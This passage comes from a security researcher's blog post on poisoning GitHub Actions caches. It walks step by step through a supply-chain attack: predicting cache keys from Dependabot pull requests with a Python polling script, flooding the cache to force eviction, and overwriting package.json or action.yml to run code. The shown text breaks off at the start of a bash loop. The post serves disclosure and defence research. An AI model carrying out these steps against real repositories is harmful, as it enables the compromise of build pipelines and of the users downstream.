https://adnanthekhan.com/wp-content/uploads/2024/04/screenshot-2024-03-09-065557.png?w=768 768w" sizes="(max-width: 1024px) 100vw, 1024px"></figure>



<p>This means that if someone can poison a cache entry, they can overwrite any file within the working directory at the time of the cache hit. This provides many paths to code execution within the context of the more privileged workflow by overwriting files like <code>package.json</code>, <code>goreleaser</code> config files, and <code>Makefile</code>.</p>



<h3 class="wp-block-heading" id="squatting-on-cache-entries">Squatting on Cache Entries</h3>



<p>After creating a payload, the next objective is to set a cache entry that will be used by the target workflow. The first hurdle for an attacker is that cache entries are immutable. They can be deleted, but it requires a <code>GITHUB_TOKEN</code> with actions: write or a similarly privileged token. For the purposes of this attack path we will assume that the <code>GITHUB_TOKEN</code> is read-only.</p>



<h4 class="wp-block-heading" id="restore-keys">Restore Keys</h4>



<p>GitHub Actions caches support restore keys. They have to be configured for each workflow, but the idea is that a key could be something like: <code>Linux-cache-&lt;SHA256 of lockfile&gt;</code>, and a workflow that updates some dependencies can hit on an older cache entry just by matching <code>Linux-cache-</code>. This way, the new build can only update what changed and then save off a new cache key. Typically a cache entry with just the restore key itself is not set.</p>



<p>Below is a screenshot from <a href="https://docs.github.com/en/actions/using-workflows/caching-dependencies-to-speed-up-workflows#cache-hits-and-misses">GitHub’s documentation covering cache restore keys</a>.</p>



<figure class="wp-block-image size-large"><img data-attachment-id="606" data-permalink="https://adnanthekhan.com/2024/05/06/the-monsters-in-your-build-cache-github-actions-cache-poisoning/image-42/" data-orig-file="https://adnanthekhan.com/wp-content/uploads/2024/04/image.png" data-orig-size="1444,432" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="image" data-image-description="" data-image-caption="" data-medium-file="https://adnanthekhan.com/wp-content/uploads/2024/04/image.png?w=300" data-large-file="https://adnanthekhan.com/wp-content/uploads/2024/04/image.png?w=1024" loading="lazy" width="1024" height="306" src="https://adnanthekhan.com/wp-content/uploads/2024/04/image.png?w=1024" alt="" class="wp-image-606" srcset="https://adnanthekhan.com/wp-content/uploads/2024/04/image.png?w=1024 1024w, https://adnanthekhan.com/wp-content/uploads/2024/04/image.png?w=150 150w, https://adnanthekhan.com/wp-content/uploads/2024/04/image.png?w=300 300w, https://adnanthekhan.com/wp-content/uploads/2024/04/image.png?w=768 768w, https://adnanthekhan.com/wp-content/uploads/2024/04/image.png 1444w" sizes="(max-width: 1024px) 100vw, 1024px"></figure>



<p>The documentation clearly outlines the manner in which cache hits occur when there are restore keys.</p>



<figure class="wp-block-image size-large"><img data-attachment-id="608" data-permalink="https://adnanthekhan.com/2024/05/06/the-monsters-in-your-build-cache-github-actions-cache-poisoning/image-1-4/" data-orig-file="https://adnanthekhan.com/wp-content/uploads/2024/04/image-1.png" data-orig-size="1440,462" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="image-1" data-image-description="" data-image-caption="" data-medium-file="https://adnanthekhan.com/wp-content/uploads/2024/04/image-1.png?w=300" data-large-file="https://adnanthekhan.com/wp-content/uploads/2024/04/image-1.png?w=1024" loading="lazy" width="1024" height="328" src="https://adnanthekhan.com/wp-content/uploads/2024/04/image-1.png?w=1024" alt="" class="wp-image-608" srcset="https://adnanthekhan.com/wp-content/uploads/2024/04/image-1.png?w=1022 1022w, https://adnanthekhan.com/wp-content/uploads/2024/04/image-1.png?w=150 150w, https://adnanthekhan.com/wp-content/uploads/2024/04/image-1.png?w=300 300w, https://adnanthekhan.com/wp-content/uploads/2024/04/image-1.png?w=768 768w, https://adnanthekhan.com/wp-content/uploads/2024/04/image-1.png 1440w" sizes="(max-width: 1024px) 100vw, 1024px"></figure>



<p>If an attacker sets a poisoned cache entry or <code>Linux-cache-</code>, then when a workflow has a cache miss but has restore key set, it will use the most recently created cache entry that matches. For repositories that frequently update dependencies with dependabot, it is likely that the hash will change and a workflow will end up hitting the poisoned cache within the 7 days it is active.</p>



<h4 class="wp-block-heading" id="anticipating-cache-keys">Anticipating Cache Keys</h4>



<p>A clever way an attacker could exploit this vulnerability is by anticipating future cache entries in the main branch based on open pull requests.</p>



<p>I’ll use a cache that hashes a yarn lockfile as an example. If the repository uses Dependabot to update versions, then an attacker could write a script to poll for a pull request that is about to update the file.<br></p>


<div class="wp-block-syntaxhighlighter-code "><div><div id="highlighter_741965" class="syntaxhighlighter  python"><table border="0" cellpadding="0" cellspacing="0"><tbody><tr><td class="gutter"><div class="line number1 index0 alt2">1</div><div class="line number2 index1 alt1">2</div><div class="line number3 index2 alt2">3</div><div class="line number4 index3 alt1">4</div><div class="line number5 index4 alt2">5</div><div class="line number6 index5 alt1">6</div><div class="line number7 index6 alt2">7</div><div class="line number8 index7 alt1">8</div><div class="line number9 index8 alt2">9</div><div class="line number10 index9 alt1">10</div><div class="line number11 index10 alt2">11</div><div class="line number12 index11 alt1">12</div><div class="line number13 index12 alt2">13</div><div class="line number14 index13 alt1">14</div><div class="line number15 index14 alt2">15</div><div class="line number16 index15 alt1">16</div><div class="line number17 index16 alt2">17</div><div class="line number18 index17 alt1">18</div><div class="line number19 index18 alt2">19</div><div class="line number20 index19 alt1">20</div><div class="line number21 index20 alt2">21</div><div class="line number22 index21 alt1">22</div><div class="line number23 index22 alt2">23</div><div class="line number24 index23 alt1">24</div><div class="line number25 index24 alt2">25</div><div class="line number26 index25 alt1">26</div><div class="line number27 index26 alt2">27</div><div class="line number28 index27 alt1">28</div><div class="line number29 index28 alt2">29</div><div class="line number30 index29 alt1">30</div><div class="line number31 index30 alt2">31</div><div class="line number32 index31 alt1">32</div><div class="line number33 index32 alt2">33</div><div class="line number34 index33 alt1">34</div><div class="line number35 index34 alt2">35</div><div class="line number36 index35 alt1">36</div><div class="line number37 index36 alt2">37</div><div class="line number38 index37 alt1">38</div><div class="line number39 index38 alt2">39</div><div class="line number40 index39 alt1">40</div><div class="line number41 index40 alt2">41</div><div class="line number42 index41 alt1">42</div><div class="line number43 index42 alt2">43</div><div class="line number44 index43 alt1">44</div><div class="line number45 index44 alt2">45</div><div class="line number46 index45 alt1">46</div><div class="line number47 index46 alt2">47</div></td><td class="code"><div class="container"><div class="line number1 index0 alt2"><code class="python keyword">import</code> <code class="python plain">requests</code></div><div class="line number2 index1 alt1"><code class="python keyword">import</code> <code class="python plain">hashlib</code></div><div class="line number3 index2 alt2"><code class="python keyword">import</code> <code class="python plain">time</code></div><div class="line number4 index3 alt1"><code class="python keyword">from</code> <code class="python plain">datetime </code><code class="python keyword">import</code> <code class="python plain">datetime, timedelta</code></div><div class="line number5 index4 alt2">&nbsp;</div><div class="line number6 index5 alt1"><code class="python plain">TOKEN </code><code class="python keyword">=</code> <code class="python string">'YOUR_GITHUB_TOKEN'</code></div><div class="line number7 index6 alt2"><code class="python plain">REPO_OWNER </code><code class="python keyword">=</code> <code class="python string">'targetOrg'</code></div><div class="line number8 index7 alt1"><code class="python plain">REPO_NAME </code><code class="python keyword">=</code> <code class="python string">'targetRepo'</code></div><div class="line number9 index8 alt2"><code class="python plain">AUTHOR </code><code class="python keyword">=</code> <code class="python string">'dependabot[bot]'</code></div><div class="line number10 index9 alt1"><code class="python plain">FILE_NAME </code><code class="python keyword">=</code> <code class="python string">'yarn.lock'</code></div><div class="line number11 index10 alt2">&nbsp;</div><div class="line number12 index11 alt1"><code class="python plain">headers </code><code class="python keyword">=</code> <code class="python plain">{</code></div><div class="line number13 index12 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python string">'Authorization'</code><code class="python plain">: f</code><code class="python string">'token {TOKEN}'</code><code class="python plain">,</code></div><div class="line number14 index13 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python string">'Accept'</code><code class="python plain">: </code><code class="python string">'application/vnd.github.v3+json'</code><code class="python plain">,</code></div><div class="line number15 index14 alt2"><code class="python plain">}</code></div><div class="line number16 index15 alt1">&nbsp;</div><div class="line number17 index16 alt2"><code class="python keyword">def</code> <code class="python plain">get_pull_requests():</code></div><div class="line number18 index17 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">url </code><code class="python keyword">=</code> <code class="python plain">f</code><code class="python string">'<a href="https://api.github.com/repos/">https://api.github.com/repos/</a>{REPO_OWNER}/{REPO_NAME}/pulls'</code></div><div class="line number19 index18 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">response </code><code class="python keyword">=</code> <code class="python plain">requests.get(url, headers</code><code class="python keyword">=</code><code class="python plain">headers)</code></div><div class="line number20 index19 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python keyword">return</code> <code class="python plain">response.json()</code></div><div class="line number21 index20 alt2">&nbsp;</div><div class="line number22 index21 alt1"><code class="python keyword">def</code> <code class="python plain">get_file_from_pull_request(pr_number):</code></div><div class="line number23 index22 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">url </code><code class="python keyword">=</code> <code class="python plain">f</code><code class="python string">'<a href="https://api.github.com/repos/">https://api.github.com/repos/</a>{REPO_OWNER}/{REPO_NAME}/pulls/{pr_number}/files'</code></div><div class="line number24 index23 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">response </code><code class="python keyword">=</code> <code class="python plain">requests.get(url, headers</code><code class="python keyword">=</code><code class="python plain">headers)</code></div><div class="line number25 index24 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python keyword">return</code> <code class="python plain">response.json()</code></div><div class="line number26 index25 alt1">&nbsp;</div><div class="line number27 index26 alt2"><code class="python keyword">def</code> <code class="python plain">compute_sha256_hash(content):</code></div><div class="line number28 index27 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">sha_hash </code><code class="python keyword">=</code> <code class="python plain">hashlib.sha256()</code></div><div class="line number29 index28 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">sha_hash.update(content)</code></div><div class="line number30 index29 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python keyword">return</code> <code class="python plain">sha_hash.hexdigest()</code></div><div class="line number31 index30 alt2">&nbsp;</div><div class="line number32 index31 alt1"><code class="python keyword">def</code> <code class="python plain">main():</code></div><div class="line number33 index32 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python keyword">while</code> <code class="python color1">True</code><code class="python plain">:</code></div><div class="line number34 index33 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">pull_requests </code><code class="python keyword">=</code> <code class="python plain">get_pull_requests()</code></div><div class="line number35 index34 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python keyword">for</code> <code class="python plain">pr </code><code class="python keyword">in</code> <code class="python plain">pull_requests:</code></div><div class="line number36 index35 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">created_at </code><code class="python keyword">=</code> <code class="python plain">datetime.strptime(pr[</code><code class="python string">'created_at'</code><code class="python plain">], </code><code class="python string">'%Y-%m-%dT%H:%M:%SZ'</code><code class="python plain">)</code></div><div class="line number37 index36 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python keyword">if</code> <code class="python plain">pr[</code><code class="python string">'user'</code><code class="python plain">][</code><code class="python string">'login'</code><code class="python plain">] </code><code class="python keyword">=</code><code class="python keyword">=</code> <code class="python plain">AUTHOR </code><code class="python keyword">and</code> <code class="python plain">created_at &gt; datetime.now() </code><code class="python keyword">-</code> <code class="python plain">timedelta(days</code><code class="python keyword">=</code><code class="python value">1</code><code class="python plain">):</code></div><div class="line number38 index37 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">files </code><code class="python keyword">=</code> <code class="python plain">get_file_from_pull_request(pr[</code><code class="python string">'number'</code><code class="python plain">])</code></div><div class="line number39 index38 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python keyword">for</code> <code class="python functions">file</code> <code class="python keyword">in</code> <code class="python plain">files:</code></div><div class="line number40 index39 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python keyword">if</code> <code class="python functions">file</code><code class="python plain">[</code><code class="python string">'filename'</code><code class="python plain">] </code><code class="python keyword">=</code><code class="python keyword">=</code> <code class="python plain">FILE_NAME:</code></div><div class="line number41 index40 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">content </code><code class="python keyword">=</code> <code class="python plain">requests.get(</code><code class="python functions">file</code><code class="python plain">[</code><code class="python string">'raw_url'</code><code class="python plain">]).content</code></div><div class="line number42 index41 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">sha256_hash </code><code class="python keyword">=</code> <code class="python plain">compute_sha256_hash(content)</code></div><div class="line number43 index42 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python functions">print</code><code class="python plain">(f</code><code class="python string">'The SHA256 hash of the updated {FILE_NAME} file is: {sha256_hash}'</code><code class="python plain">)</code></div><div class="line number44 index43 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">time.sleep(</code><code class="python value">30</code><code class="python plain">)</code></div><div class="line number45 index44 alt2">&nbsp;</div><div class="line number46 index45 alt1"><code class="python keyword">if</code> <code class="python plain">__name__ </code><code class="python keyword">=</code><code class="python keyword">=</code> <code class="python string">'__main__'</code><code class="python plain">:</code></div><div class="line number47 index46 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">main(</code></div></div></td></tr></tbody></table></div></div></div>


<p>If the pull request is merged within 7 days, then the poisoned cache will be used <em>instead </em>of the workflow creating a new cache entry.</p>



<p>This script could even be extended to automatically perform the steps necessary to exploit the pwn request or injection vulnerability when the pull request is merged, but I’ll leave that as an activity for readers.</p>



<h3 class="wp-block-heading" id="blasting-the-cache">Blasting the Cache</h3>



<p>If it is not possible for an attacker to predict a future cache entry, then the main obstacle attackers face is that existing entries cannot be overwritten using the cache token. What if this cache entry hasn’t changed in months, and a scheduled workflow keeps refreshing it? Anticipating a future entry is out, and so is simply waiting. Are we stuck?</p>



<p><strong>There is a way.</strong></p>



<p>GitHub’s cache is limited to 10 GB per repository. Once the limit is reached, the least recently used entries are subject to eviction. In practice, this seems to happen once a day, but it might take two if the repository typically does not approach the limit.</p>



<figure class="wp-block-image size-large"><img data-attachment-id="524" data-permalink="https://adnanthekhan.com/2024/05/06/the-monsters-in-your-build-cache-github-actions-cache-poisoning/designer-1/" data-orig-file="https://adnanthekhan.com/wp-content/uploads/2024/03/designer-1.png" data-orig-size="1024,1024" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="designer-1" data-image-description="" data-image-caption="" data-medium-file="https://adnanthekhan.com/wp-content/uploads/2024/03/designer-1.png?w=300" data-large-file="https://adnanthekhan.com/wp-content/uploads/2024/03/designer-1.png?w=1024" loading="lazy" width="1024" height="1024" src="https://adnanthekhan.com/wp-content/uploads/2024/03/designer-1.png?w=1024" alt="" class="wp-image-524" srcset="https://adnanthekhan.com/wp-content/uploads/2024/03/designer-1.png 1024w, https://adnanthekhan.com/wp-content/uploads/2024/03/designer-1.png?w=150 150w, https://adnanthekhan.com/wp-content/uploads/2024/03/designer-1.png?w=300 300w, https://adnanthekhan.com/wp-content/uploads/2024/03/designer-1.png?w=768 768w" sizes="(max-width: 1024px) 100vw, 1024px"></figure>



<p>If an attacker can set as many cache entries as they want from any workflow, this allows them to fill the cache full of entries in order to force eviction of other cached items. Once the cache eviction job runs, the “reserved” cache entries will be cleared and the attacker can poison those entries with malicious files. <strong>This is where the 6 hour window makes a difference.</strong> </p>



<p>An attacker can steal a token, use it to fill the cache, wait for the eviction job to run, and finally poison the cache entries <strong>all within the 6 hour window</strong>. In practice, an attacker could trigger the initial vulnerability on a Friday night and start poisoning the cache. They might have to give it another try on Sunday, but by Monday they will most likely succeed.</p>



<h3 class="wp-block-heading" id="poc-time">PoC Time</h3>



<p>I wrote a tool to directly save cache entries using the CacheServerUrl and AccessToken. This script will be used for both the filling the cache and poisoning it.</p>



<p>You can find the script here: <a href="https://github.com/AdnaneKhan/ActionsCacheBlasting">https://github.com/AdnaneKhan/ActionsCacheBlasting</a></p>



<p>These steps start off assuming that you’ve already found a workflow that allows you to run code in the context of the <code>main</code> branch. In most cases this will be one where maintainers use <code>pull_request</code>_target and set the <code>GITHUB_TOKEN</code> to read only because they think it is safe.</p>



<h3 class="wp-block-heading" id="finding-an-injection-point">Finding an Injection Point</h3>



<p>The tricky part about designing a cache poisoning payload is figuring out what file to overwrite. This will be highly dependent on what the workflow does after the cache restore step.</p>



<p>I recommend taking a look at BoostSecurity’s great work with the <a href="https://boostsecurityio.github.io/lotp">Living-Off-the-Pipeline</a> project to learn about various files that can be modified to get arbitrary code execution within workflows.</p>



<p>For example, if you are trying to poison a nodejs project, you can modify the <code>package.json</code> file and add a <code>preinstall</code> step to contain your payload. There are <em>many</em> ways turn file write in a workflow into code execution, and this will take some close analysis and testing within a fork to determine the best injection point.</p>



<p>If there isn’t a clear injection point, then there is a fallback that will almost always work. Reusable GitHub Actions are locally saved to the runner’s temp directory during workflow execution. Modifying the <code>action.yml</code> or <code>index.js</code> for these actions is guaranteed to provide arbitrary code execution.</p>



<h3 class="wp-block-heading" id="setting-the-trap">Setting the Trap</h3>



<p>Once you have your injection point, you will want to fill the cache prior to the eviction job. Right around 11 PM EST, run your PR workflow to grab the cache token and cache URL.</p>



<p>Next, dump about 30 GB of random files into the cache.</p>



<figure class="wp-block-image size-large"><img data-attachment-id="541" data-permalink="https://adnanthekhan.com/2024/05/06/the-monsters-in-your-build-cache-github-actions-cache-poisoning/screenshot-2024-03-08-175306/" data-orig-file="https://adnanthekhan.com/wp-content/uploads/2024/03/screenshot-2024-03-08-175306.png" data-orig-size="2662,1310" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="screenshot-2024-03-08-175306" data-image-description="" data-image-caption="" data-medium-file="https://adnanthekhan.com/wp-content/uploads/2024/03/screenshot-2024-03-08-175306.png?w=300" data-large-file="https://adnanthekhan.com/wp-content/uploads/2024/03/screenshot-2024-03-08-175306.png?w=1024" loading="lazy" width="1024" height="503" src="https://adnanthekhan.com/wp-content/uploads/2024/03/screenshot-2024-03-08-175306.png?w=1024" alt="" class="wp-image-541" srcset="https://adnanthekhan.com/wp-content/uploads/2024/03/screenshot-2024-03-08-175306.png?w=1022 1022w, https://adnanthekhan.com/wp-content/uploads/2024/03/screenshot-2024-03-08-175306.png?w=2044 2044w, https://adnanthekhan.com/wp-content/uploads/2024/03/screenshot-2024-03-08-175306.png?w=150 150w, https://adnanthekhan.com/wp-content/uploads/2024/03/screenshot-2024-03-08-175306.png?w=300 300w, https://adnanthekhan.com/wp-content/uploads/2024/03/screenshot-2024-03-08-175306.png?w=768 768w" sizes="(max-width: 1024px) 100vw, 1024px"></figure>



<p>Following this, write a script to try and poison your target cache entries every minute with the same payload. </p>



<p>To find out what the legitimate cache keys and versions are, simply use the GitHub API like so: <a href="https://api.github.com/repos/angular/angular/actions/caches?ref=refs/heads/main"><code>https://api.github.com/repos/angular/angular/actions/caches?ref=refs/heads/main</code></a>. This returns a list of all cache entries on the <code>main</code> branch along with their versions.</p>


<div class="wp-block-syntaxhighlighter-code "><div><div id="highlighter_605519" class="syntaxhighlighter  plain"><table border="0" cellpadding="0" cellspacing="0"><tbody><tr><td class="gutter"><div class="line number1 index0 alt2">1</div><div class="line number2 index1 alt1">2</div><div class="line number3 index2 alt2">3</div><div class="line number4 index3 alt1">4</div><div class="line number5 index4 alt2">5</div><div class="line number6 index5 alt1">6</div><div class="line number7 index6 alt2">7</div><div class="line number8 index7 alt1">8</div><div class="line number9 index8 alt2">9</div><div class="line number10 index9 alt1">10</div><div class="line number11 index10 alt2">11</div><div class="line number12 index11 alt1">12</div><div class="line number13 index12 alt2">13</div><div class="line number14 index13 alt1">14</div><div class="line number15 index14 alt2">15</div><div class="line number16 index15 alt1">16</div><div class="line number17 index16 alt2">17</div><div class="line number18 index17 alt1">18</div><div class="line number19 index18 alt2">19</div><div class="line number20 index19 alt1">20</div><div class="line number21 index20 alt2">21</div><div class="line number22 index21 alt1">22</div><div class="line number23 index22 alt2">23</div><div class="line number24 index23 alt1">24</div><div class="line number25 index24 alt2">25</div><div class="line number26 index25 alt1">26</div><div class="line number27 index26 alt2">27</div><div class="line number28 index27 alt1">28</div><div class="line number29 index28 alt2">29</div><div class="line number30 index29 alt1">30</div><div class="line number31 index30 alt2">31</div></td><td class="code"><div class="container"><div class="line number1 index0 alt2"><code class="plain plain">{</code></div><div class="line number2 index1 alt1"><code class="plain spaces">&nbsp;&nbsp;</code><code class="plain plain">"total_count": 11,</code></div><div class="line number3 index2 alt2"><code class="plain spaces">&nbsp;&nbsp;</code><code class="plain plain">"actions_caches": [</code></div><div class="line number4 index3 alt1"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">{</code></div><div class="line number5 index4 alt2"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">"id": 23332,</code></div><div class="line number6 index5 alt1"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">"ref": "refs/heads/main",</code></div><div class="line number7 index6 alt2"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">"key": "codeql-trap-1-2.17.0-javascript-74333e622141e73b22791e24bcfe01d7247489a6",</code></div><div class="line number8 index7 alt1"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">"version": "801c2033d34f5527515cf4db177503fe272d4179b9f27199bff1b2af3a149cfb",</code></div><div class="line number9 index8 alt2"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">"last_accessed_at": "2024-04-22T16:58:15.130000000Z",</code></div><div class="line number10 index9 alt1"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">"created_at": "2024-04-22T16:58:15.130000000Z",</code></div><div class="line number11 index10 alt2"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">"size_in_bytes": 23315464</code></div><div class="line number12 index11 alt1"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">},</code></div><div class="line number13 index12 alt2"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">{</code></div><div class="line number14 index13 alt1"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">"id": 23048,</code></div><div class="line number15 index14 alt2"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">"ref": "refs/heads/main",</code></div><div class="line number16 index15 alt1"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">"key": "bazel-cache-Linux-6155c49c06be80adb418f29a249f473d3a4bedb59a88790409e0c10bd799599b",</code></div><div class="line number17 index16 alt2"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">"version": "2f7653528908dea1a7655dfac1094fa1b395bb1461918caeaf5135bb4f5dc7ac",</code></div><div class="line number18 index17 alt1"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">"last_accessed_at": "2024-04-22T16:55:35.443333300Z",</code></div><div class="line number19 index18 alt2"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">"created_at": "2024-04-12T23:12:36.960000000Z",</code></div><div class="line number20 index19 alt1"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">"size_in_bytes": 611053325</code></div><div class="line number21 index20 alt2"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">},</code></div><div class="line number22 index21 alt1"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">{</code></div><div class="line number23 index22 alt2"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">"id": 23290,</code></div><div class="line number24 index23 alt1"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">"ref": "refs/heads/main",</code></div><div class="line number25 index24 alt2"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">"key": "Linux-fefd5b87ee1a56ff67cd62516e1305750d046b67b448e194f806cf553a34e8f6",</code></div><div class="line number26 index25 alt1"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">"version": "c68924f4e2fff23864c4b43173b9c1f52f6dc648ddb14ab543385836ccbc9cfe",</code></div><div class="line number27 index26 alt2"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">"last_accessed_at": "2024-04-22T16:55:16.966666700Z",</code></div><div class="line number28 index27 alt1"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">"created_at": "2024-04-19T20:30:29.730000000Z",</code></div><div class="line number29 index28 alt2"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">"size_in_bytes": 525666806</code></div><div class="line number30 index29 alt1"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">},</code></div><div class="line number31 index30 alt2"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">{</code></div></div></td></tr></tbody></table></div></div></div>


<p>Let this run for the next three hours.</p>



<pre class="wp-block-code"><code>#!/bin/bash

for i in {1..240}
do
